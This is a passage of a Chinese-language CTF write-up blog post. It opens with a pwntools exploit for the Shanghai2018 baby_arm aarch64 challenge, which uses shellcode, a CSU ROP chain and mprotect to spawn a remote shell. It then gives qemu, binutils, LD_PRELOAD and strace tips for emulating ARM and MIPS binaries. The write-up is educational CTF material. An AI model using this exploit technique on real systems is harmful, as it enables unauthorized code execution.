    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;106.75.126.171&#34;</span><span class="p">,</span> <span class="mi">33865</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">csu_rop</span><span class="p">(</span><span class="n">call</span><span class="p">,</span> <span class="n">x0</span><span class="p">,</span> <span class="n">x1</span><span class="p">,</span> <span class="n">x2</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="mh">0x4008CC</span><span class="p">,</span> <span class="s1">&#39;00000000&#39;</span><span class="p">,</span> <span class="mh">0x4008ac</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">call</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">(</span><span class="n">x2</span><span class="p">,</span> <span class="n">x1</span><span class="p">,</span> <span class="n">x0</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;22222222&#39;</span>
    <span class="k">return</span> <span class="n">payload</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
    <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./pwn&#34;</span><span class="p">,</span> <span class="n">checksec</span> <span class="o">=</span> <span class="bp">False</span><span class="p">)</span>
    <span class="n">padding</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s1">&#39;mov x0, x0&#39;</span><span class="p">)</span>

    <span class="n">sc</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">execve</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">))</span>
    <span class="c1">#  print disasm(padding * 0x10 + sc)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;Name:&#34;</span><span class="p">,</span> <span class="n">padding</span> <span class="o">*</span> <span class="mh">0x10</span> <span class="o">+</span> <span class="n">sc</span><span class="p">)</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>

    <span class="c1">#  io.send(cyclic(length = 500, n = 8))</span>
    <span class="c1">#  rop = flat()</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">72</span><span class="p">),</span> <span class="n">csu_rop</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;__gmon_start__&#39;</span><span class="p">],</span> <span class="mi">8</span><span class="p">))</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">(</span><span class="mh">0x400824</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">flat</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;mprotect&#39;</span><span class="p">]))</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>

    <span class="nb">raw_input</span><span class="p">(</span><span class="s2">&#34;DEBUG: &#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;Name:&#34;</span><span class="p">,</span> <span class="n">padding</span> <span class="o">*</span> <span class="mh">0x10</span> <span class="o">+</span> <span class="n">sc</span><span class="p">)</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>

    <span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">72</span><span class="p">),</span> <span class="n">csu_rop</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;__gmon_start__&#39;</span><span class="p">],</span> <span class="mh">0x411000</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mi">7</span><span class="p">))</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">(</span><span class="mh">0x411068</span><span class="p">)</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="notice">notice</h3>
<p>同时需要注意的是，<code>checksec</code> 检测的结果是开了 nx 保护，但这样检测的结果不一定准确，因为程序的 nx 保护也可以通过 qemu 启动时的参数 <code>-nx</code> 来决定（比如这道题目就可以通过远程失败时的报错发现程序开了 nx 保护），老版的 qemu 可能没有这个参数。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">Desktop ./qemu-aarch64 --version
qemu-aarch64 version 2.7.0, Copyright <span class="o">(</span>c<span class="o">)</span> 2003-2016 Fabrice Bellard and the QEMU Project developers
Desktop ./qemu-aarch64 -h<span class="p">|</span> grep nx
-nx           QEMU_NX           <span class="nb">enable</span> NX implementation
</code></pre></td></tr></table>
</div>
</div><p>如果有如下的报错，说明没有 aarch64 的汇编器</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>ERROR<span class="o">]</span> Could not find <span class="s1">&#39;as&#39;</span> installed <span class="k">for</span> ContextType<span class="o">(</span><span class="nv">arch</span> <span class="o">=</span> <span class="s1">&#39;aarch64&#39;</span>, <span class="nv">binary</span> <span class="o">=</span> ELF<span class="o">(</span><span class="s1">&#39;/home/m4x/Projects/ctf-challenges/pwn/arm/Shanghai2018_baby_arm/pwn&#39;</span><span class="o">)</span>, <span class="nv">bits</span> <span class="o">=</span> 64, <span class="nv">endian</span> <span class="o">=</span> <span class="s1">&#39;little&#39;</span>, <span class="nv">log_level</span> <span class="o">=</span> 10<span class="o">)</span>
    Try installing binutils <span class="k">for</span> this architecture:
    https://docs.pwntools.com/en/stable/install/binutils.html
</code></pre></td></tr></table>
</div>
</div><p>可以参考官方文档的解决方案</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">Shanghai2018_baby_arm <span class="o">[</span>master●<span class="o">]</span> apt search binutils<span class="p">|</span> grep aarch64
p   binutils-aarch64-linux-gnu                                         - GNU binary utilities, <span class="k">for</span> aarch64-linux-gnu target                           
p   binutils-aarch64-linux-gnu:i386                                    - GNU binary utilities, <span class="k">for</span> aarch64-linux-gnu target                           
p   binutils-aarch64-linux-gnu-dbg                                     - GNU binary utilities, <span class="k">for</span> aarch64-linux-gnu target <span class="o">(</span>debug symbols<span class="o">)</span>           
p   binutils-aarch64-linux-gnu-dbg:i386                                - GNU binary utilities, <span class="k">for</span> aarch64-linux-gnu target <span class="o">(</span>debug symbols<span class="o">)</span>     
Shanghai2018_baby_arm <span class="o">[</span>master●<span class="o">]</span> sudo apt install bintuils-aarch64-linux-gnu
</code></pre></td></tr></table>
</div>
</div><blockquote>
<p>aarch64 的文件在装 libc 时是 <code>arm64</code>，在装 <code>binutils</code> 时是 <code>aarch64</code></p>
</blockquote>
<h2 id="more-1">More</h2>
<ul>
<li>libc_datebase for arm?</li>
<li>如何多快好省的分析 strip 后的程序
<ul>
<li>后来了解到，对于静态编译的 bianry， 可以使用 lscan, flirt, rizzo, bindiff 等多种方法恢复部分符号表</li>
</ul>
</li>
</ul>
<h2 id="后记">后记</h2>
<p>后来遇到 pwnable.kr 的 mipstake 这道题目，发现用以前的方法不能运行了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">pwnable_mipstake <span class="o">[</span>master●●<span class="o">]</span> ls lib 
ld.so.1  libc.so.6
pwnable_mipstake <span class="o">[</span>master●●<span class="o">]</span> bat run.sh 
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: run.sh
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────
   <span class="m">1</span>   │ <span class="c1">#!/usr/bin/env bash</span>
   <span class="m">2</span>   │ <span class="nb">set</span> -euxo pipefail
   <span class="m">3</span>   │ 
   <span class="m">4</span>   │ <span class="nb">unset</span> LD_LIBRARY_PATH
   <span class="m">5</span>   │ qemu-mips -L ./ ./mipstake
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────
pwnable_mipstake <span class="o">[</span>master●●<span class="o">]</span> ./run.sh 
+ <span class="nb">unset</span> LD_LIBRARY_PATH
+ qemu-mips -L ./ ./mipstake
qemu: uncaught target signal <span class="m">11</span> <span class="o">(</span>Segmentation fault<span class="o">)</span> - core dumped
./run.sh: 行 5: <span class="m">14538</span> 段错误               qemu-mips -L ./ ./mipstake
</code></pre></td></tr></table>
</div>
</div><blockquote>
<p>把 ld.so, libc.so 放到同一目录下而不是使用 <code>-L /usr/mips-linux-gnu/</code>，可以让 gdb-multiarch 在调试时更清楚的识别对应的地址是什么文件而不只是显示一个 <code>[linker]</code>。这是在和 <a href="http://myhackerworld.top/2018/10/22/HITCON-CTF-2018-tooooo/">D4rk3r</a> 师傅讨论一道题目的时候偶然发现的。</p>
</blockquote>
<p>但 <code>ld.so.1</code>，<code>libc.so.6</code> 在我本地又是可以运行的，说明不是 libc 版本的问题。</p>
<p>用 <code>strace</code> 跟踪一下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">pwnable_mipstake <span class="o">[</span>master●●<span class="o">]</span> <span class="nb">unset</span> LD_LIBRARY_PATH          
pwnable_mipstake <span class="o">[</span>master●●<span class="o">]</span> qemu-mips -strace -L ./ ./mipstake
<span class="m">14911</span> brk<span class="o">(</span>NULL<span class="o">)</span> <span class="o">=</span> 0x00412000
<span class="m">14911</span> mmap2<span class="o">(</span>NULL,8192,PROT_READ<span class="p">|</span>PROT_WRITE,MAP_PRIVATE<span class="p">|</span>MAP_ANONYMOUS,-1,0<span class="o">)</span> <span class="o">=</span> 0x7f7c8000
<span class="m">14911</span> uname<span class="o">(</span>0x7fffeac8<span class="o">)</span> <span class="o">=</span> <span class="m">0</span>
<span class="m">14911</span> access<span class="o">(</span><span class="s2">&#34;/etc/ld.so.nohwcap&#34;</span>,F_OK<span class="o">)</span> <span class="o">=</span> -1 <span class="nv">errno</span><span class="o">=</span><span class="m">2</span> <span class="o">(</span>No such file or directory<span class="o">)</span>
<span class="m">14911</span> access<span class="o">(</span><span class="s2">&#34;/etc/ld.so.preload&#34;</span>,R_OK<span class="o">)</span> <span class="o">=</span> -1 <span class="nv">errno</span><span class="o">=</span><span class="m">2</span> <span class="o">(</span>No such file or directory<span class="o">)</span>
<span class="m">14911</span> openat<span class="o">(</span>AT_FDCWD,<span class="s2">&#34;/etc/ld.so.cache&#34;</span>,O_RDONLY<span class="p">|</span>O_CLOEXEC<span class="o">)</span> <span class="o">=</span> <span class="m">3</span>
<span class="m">14911</span> fstat64<span class="o">(</span>3,0x7fffe718<span class="o">)</span> <span class="o">=</span> <span class="m">0</span>
<span class="m">14911</span> mmap2<span class="o">(</span>NULL,148329,PROT_READ,MAP_PRIVATE,3,0<span class="o">)</span> <span class="o">=</span> 0x7f7a3000
<span class="m">14911</span> close<span class="o">(</span>3<span class="o">)</span> <span class="o">=</span> <span class="m">0</span>
--- SIGSEGV <span class="o">{</span><span class="nv">si_signo</span><span class="o">=</span>SIGSEGV, <span class="nv">si_code</span><span class="o">=</span>1, <span class="nv">si_addr</span><span class="o">=</span>0xcf9e3008<span class="o">}</span> ---
qemu: uncaught target signal <span class="m">11</span> <span class="o">(</span>Segmentation fault<span class="o">)</span> - core dumped
<span class="o">[</span>1<span class="o">]</span>    <span class="m">14911</span> segmentation fault  qemu-mips -strace -L ./ ./mipstake
</code></pre></td></tr></table>
</div>
</div><p>发现了问题，<code>/etc/ld.so.nohwacap</code>，<code>/etc/ld.so.preload</code> 这些文件不存在（原因可能是因为只用包管理装了对应 arch 的 libc 而没有其他信息）</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">pwnable_mipstake <span class="o">[</span>master●●<span class="o">]</span> ls /usr/mips-linux-gnu 
lib

<span class="c1"># 没有 etc 这个目录</span>
</code></pre></td></tr></table>
</div>
</div><p>那么 <code>/etc/ld.so.nohwacap</code> 这些文件是什么作用呢？google 了一下，发现大概就是和 <code>LD_PRELOAD</code> 一个作用</p>
<blockquote>
<p><a href="https://superuser.com/a/1183252/960572">https://superuser.com/a/1183252/960572</a></p>
</blockquote>
<p>但知道了原因，不知道要怎么解决。。。刚开始是想看看有没有什么包能安装其他 arch 的 <code>/etc/ld.so.preload</code> 这些文件，但找了一圈没找到（如果有师傅有这样的解决方法请务必指教）。</p>
<p>后来偶然搜索到了这部分的 <a href="https://code.woboq.org/userspace/glibc/elf/rtld.c.html#1606">源码</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">  /* We have two ways to specify objects to preload: via environment
     variable and via the file /etc/ld.so.preload.  The latter can also
     be used when security is enabled.  */
  assert (*first_preload == NULL);
  struct link_map **preloads = NULL;
  unsigned int npreloads = 0;
  if (__glibc_unlikely (preloadlist != NULL))
    {
      HP_TIMING_NOW (start);
      npreloads += handle_ld_preload (preloadlist, main_map);
      HP_TIMING_NOW (stop);
      HP_TIMING_DIFF (diff, start, stop);
      HP_TIMING_ACCUM_NT (load_time, diff);
    }
  /* There usually is no ld.so.preload file, it should only be used
     for emergencies and testing.  So the open call etc should usually
     fail.  Using access() on a non-existing file is faster than using
     open().  So we do this first.  If it succeeds we do almost twice
     the work but this does not matter, since it is not for production
     use.  */
</code></pre></td></tr></table>
</div>
</div><p>从注释找到了解决方案，没有 <code>/etc/ld.so.preload</code>，我们还可以更改 <code>LD_PRELAOD</code> 这个环境变量。</p>
<p>修改一下运行脚本</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">pwnable_mipstake <span class="o">[</span>master●●<span class="o">]</span> bat run.sh 
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: run.sh
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────
   <span class="m">1</span>   │ <span class="c1">#!/usr/bin/env bash</span>
   <span class="m">2</span>   │ <span class="nb">set</span> -euxo pipefail
   <span class="m">3</span>   │ 
   <span class="m">4</span>   │ <span class="nv">LD_PRELOAD</span><span class="o">=</span><span class="s2">&#34;./lib/libc.so.6&#34;</span> <span class="s2">&#34;./lib/ld.so.1&#34;</span> <span class="s2">&#34;./mipstake&#34;</span>
   <span class="m">5</span>   │ qemu-mips ./mipstake
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────
pwnable_mipstake <span class="o">[</span>master●●<span class="o">]</span> ./run.sh 
+ <span class="nv">LD_PRELOAD</span><span class="o">=</span>./lib/libc.so.6
+ ./lib/ld.so.1 ./mipstake
ERROR: ld.so: object <span class="s1">&#39;./lib/libc.so.6&#39;</span> from LD_PRELOAD cannot be preloaded <span class="o">(</span>wrong ELF class: ELFCLASS32<span class="o">)</span>: ignored.
no need to brute-force..
listening...
^C
</code></pre></td></tr></table>
</div>
</div><p>终于可以正常运行了，虽然还有报错，但只是 64 位系统和 32 位 libc 的兼容问题，影响不大。</p>
<h2 id="last">Last</h2>
<p>后来又发现只用 user mode 的 qemu 来模拟还是有很多缺陷的。。。像 gdb-multriarch 莫名跑飞或者甚至文件都不能运行。踩了很多次坑后有如下发现：</p>
<ol>
<li>可以使用 docker，推荐 <code>skysider/multiarch-docker</code>。大部分的问题应该都能解决了</li>
<li>如果再调试时有问题，可以试下不用 gdb plugin，有些插件对异架构的识别效果并不好</li>
<li>如果还有问题，那就只能用系统级的 qemu 来模拟了，推荐一片 <a href="https://www.ringzerolabs.com/2018/03/the-wonderful-world-of-mips.html">文章</a></li>
</ol>
<p>如上边链接中所说</p>
<blockquote>
<p>MIPS system is generally the most effective method of debugging as you do not have to deal with the process being emulated inside of an x86 QEMU User Mode process.</p>
</blockquote>
<p>本文将不再更新(除非遇到很让人眼前一亮的方法)，但欢迎私下交流和介绍经验:)</p>
<h2 id="reference-1">Reference</h2>
<p><a href="https://elixir.bootlin.com/linux/v2.6.32.51/source/arch/arm/include/asm/unistd.h">https://elixir.bootlin.com/linux/v2.6.32.51/source/arch/arm/include/asm/unistd.h</a></p>
<p><a href="https://bbs.pediy.com/thread-224583.htm">https://bbs.pediy.com/thread-224583.htm</a></p>
<p><a href="https://courses.washington.edu/cp105/02_Exceptions/Calling%20Standard.html">https://courses.washington.edu/cp105/02_Exceptions/Calling%20Standard.html</a></p>
<p><a href="http://hideroot.tistory.com/46">http://hideroot.tistory.com/46</a></p>
<p><a href="http://www.freebuf.com/articles/terminal/134980.html">http://www.freebuf.com/articles/terminal/134980.html</a></p>
<p><a href="https://code.woboq.org/userspace/glibc/elf/rtld.c.html#1606">https://code.woboq.org/userspace/glibc/elf/rtld.c.html#1606</a></p>
<p><a href="https://superuser.com/a/1183252/960572">https://superuser.com/a/1183252/960572</a></p>
<p><a href="https://www.ringzerolabs.com/2018/03/the-wonderful-world-of-mips.html">https://www.ringzerolabs.com/2018/03/the-wonderful-world-of-mips.html</a></p>

    </div>

    
    


    
    

    <footer class="post-footer">
      <div class="post-tags">
          <a href="https://bash-c.github.io/tags/arm/">arm</a>
          <a href="https://bash-c.github.io/tags/pwn/">pwn</a>
          
        </div>

      
      <nav class="post-nav">
        
          <a class="prev" href="/post/whitehat2018-pwn-writeup/">
            
            <i class="iconfont">
              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="18" height="18">
  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
</svg>

            </i>
            <span class="prev-text nav-default">WhiteHat2018 Pwn Writeup</span>
            <span class="prev-text nav-mobile">Prev</span>
          </a>
        
          <a class="next" href="/post/pin-in-ctf/">
            <span class="next-text nav-default">Reverse is Multiplex, You Need Pintools</span>
            <span class="prev-text nav-mobile">Next</span>
            
            <i class="iconfont">
              <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="18" height="18">
  <path d="M332.091514 74.487481l-75.369571 89.491197c-10.963703 12.998035-10.285251 32.864502 1.499144 44.378743l286.278095 300.375162L266.565125 819.058374c-11.338233 12.190647-11.035334 32.285311 0.638543 44.850487l80.46666 86.564541c11.680017 12.583596 30.356378 12.893658 41.662889 0.716314l377.434212-421.426145c11.332093-12.183484 11.041474-32.266891-0.657986-44.844348l-80.46666-86.564541c-1.772366-1.910513-3.706415-3.533476-5.750981-4.877077L373.270379 71.774697C361.493148 60.273758 343.054193 61.470003 332.091514 74.487481z"></path>
</svg>

            </i>
          </a>
      </nav>
    </footer>
  </article>

  
  

  
  

  
  
    <div class="post bg-white">
      <script src="https://utteranc.es/client.js"
            repo= "bash-c/bash-c.github.io"
            issue-term="pathname"
            crossorigin="anonymous"
            async>
      </script>
    </div>
  

  

  

  
  
    



        </div>
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="icon-links">
  
  
    <a href="mailto:aboultraman@gmail.com" rel="me noopener" class="iconfont"
      title="email" >
      <svg class="icon" viewBox="0 0 1451 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="36" height="36">
  <path d="M664.781909 681.472759 0 97.881301C0 3.997201 71.046997 0 71.046997 0L474.477909 0 961.649408 0 1361.641813 0C1361.641813 0 1432.688811 3.997201 1432.688811 97.881301L771.345323 681.472759C771.345323 681.472759 764.482731 685.154773 753.594283 688.65053L753.594283 688.664858C741.602731 693.493018 729.424896 695.068979 718.077952 694.839748 706.731093 695.068979 694.553173 693.493018 682.561621 688.664858L682.561621 688.65053C671.644501 685.140446 664.781909 681.472759 664.781909 681.472759L664.781909 681.472759ZM718.063616 811.603883C693.779541 811.016482 658.879232 802.205449 619.10784 767.734955 542.989056 701.759633 0 212.052267 0 212.052267L0 942.809523C0 942.809523 0 1024 83.726336 1024L682.532949 1024 753.579947 1024 1348.948139 1024C1432.688811 1024 1432.688811 942.809523 1432.688811 942.809523L1432.688811 212.052267C1432.688811 212.052267 893.138176 701.759633 817.019477 767.734955 777.248 802.205449 742.347691 811.03081 718.063616 811.603883L718.063616 811.603883Z"></path>
</svg>

    </a>
  
    <a href="https://twitter.com/M4x_1997" rel="me noopener" class="iconfont"
      title="twitter"  target="_blank"
      >
      <svg class="icon" viewBox="0 0 1264 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="36" height="36">
  <path d="M1229.8616 18.043658c0 0-117.852626 63.135335-164.151872 67.344358-105.225559-164.151872-505.082682-92.598492-437.738325 223.078185C278.622548 312.675223 89.216542 47.506814 89.216542 47.506814s-117.852626 189.406006 75.762402 345.139833C127.097743 396.85567 55.544363 371.601535 55.544363 371.601535S26.081207 535.753407 253.368414 615.724832c-21.045112 29.463156-113.643603 8.418045-113.643603 8.418045s25.254134 143.10676 231.496229 180.987961c-143.10676 130.479693-387.230056 92.598492-370.393967 105.225559 206.242095 189.406006 1119.599946 231.496229 1128.01799-643.98042C1179.353331 249.539887 1263.533778 123.269217 1263.533778 123.269217s-130.479693 37.881201-138.897738 33.672179C1225.652577 98.015083 1229.8616 18.043658 1229.8616 18.043658"></path>
</svg>

    </a>
  
    <a href="https://github.com/bash-c" rel="me noopener" class="iconfont"
      title="github"  target="_blank"
      >
      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="36" height="36">
  <path d="M512 12.672c-282.88 0-512 229.248-512 512 0 226.261333 146.688 418.133333 350.08 485.76 25.6 4.821333 34.986667-11.008 34.986667-24.618667 0-12.16-0.426667-44.373333-0.64-87.04-142.421333 30.890667-172.458667-68.693333-172.458667-68.693333C188.672 770.986667 155.008 755.2 155.008 755.2c-46.378667-31.744 3.584-31.104 3.584-31.104 51.413333 3.584 78.421333 52.736 78.421333 52.736 45.653333 78.293333 119.850667 55.68 149.12 42.581333 4.608-33.109333 17.792-55.68 32.426667-68.48-113.706667-12.8-233.216-56.832-233.216-253.013333 0-55.893333 19.84-101.546667 52.693333-137.386667-5.76-12.928-23.04-64.981333 4.48-135.509333 0 0 42.88-13.738667 140.8 52.48 40.96-11.392 84.48-17.024 128-17.28 43.52 0.256 87.04 5.888 128 17.28 97.28-66.218667 140.16-52.48 140.16-52.48 27.52 70.528 10.24 122.581333 5.12 135.509333 32.64 35.84 52.48 81.493333 52.48 137.386667 0 196.693333-119.68 240-233.6 252.586667 17.92 15.36 34.56 46.762667 34.56 94.72 0 68.522667-0.64 123.562667-0.64 140.202666 0 13.44 8.96 29.44 35.2 24.32C877.44 942.592 1024 750.592 1024 524.672c0-282.752-229.248-512-512-512"></path>
</svg>

    </a>


<a href="https://bash-c.github.io/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
    class="iconfont" title="rss" target="_blank">
    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="30" height="30">
  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
</svg>

  </a>
   
</div>

<div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme - <a class="theme-link" href="https://github.com/xianmin/hugo-theme-jane">Jane</a>
  </span>

  <span class="copyright-year">
    &copy;
    
       -
    2020
    <span class="heart">
      
      <i class="iconfont">
        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="14" height="14">
  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
   fill="#8a8a8a"></path>
</svg>

      </i>
    </span><span class="author">
        M4x
        
      </span></span>

  
  
    <span id="busuanzi_container">
      访客数/访问量：<span id="busuanzi_value_site_uv"></span>/<span id="busuanzi_value_site_pv"></span>
    </span>
  

  
</div>

    </footer>

    <div class="back-to-top" id="back-to-top">
      <i class="iconfont">
        
        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="35" height="35">
